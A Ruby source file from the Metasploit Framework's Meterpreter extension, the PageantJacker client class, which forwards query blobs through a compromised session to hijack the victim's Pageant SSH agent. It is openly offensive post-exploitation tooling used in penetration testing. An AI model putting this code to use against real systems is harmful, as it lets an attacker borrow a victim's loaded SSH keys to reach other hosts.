# -*- coding: binary -*-

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Extapi
          module Pageant
            ###
            # PageantJacker extension - Hijack and interact with Pageant
            #
            # Stuart Morgan <stuart.morgan@mwrinfosecurity.com>
            #
            ###
            class Pageant
              def initialize(client)
                @client = client
              end

              def forward(blob, size)
                return nil unless size > 0 && blob.size > 0

                packet_request = Packet.create_request('extapi_pageant_send_query')
                packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANT_SIZE_IN, size)
                packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANT_BLOB_IN, blob)

                response = client.send_request(packet_request)
                return nil unless response

                {
                  success: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANT_STATUS),
                  blob: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANT_RETURNEDBLOB),
                  error: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANT_ERRORMESSAGE)
                }
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
